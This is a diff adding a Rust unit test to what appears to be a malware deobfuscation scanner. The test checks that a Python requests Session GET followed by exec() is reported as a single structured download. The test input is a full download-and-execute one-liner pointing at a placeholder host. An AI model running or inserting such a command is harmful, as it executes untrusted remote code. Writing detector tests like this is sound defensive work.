@@ -11404,6 +11404,38 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_session_request_get_variable_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; s = requests.Session(); u = 'https://py.example/session-request-var'; exec(s.request('GET', u).text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/session-request-var" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests Session.request GET variable URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/session-request-var")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests Session.request GET variable URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_bound_session_get_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
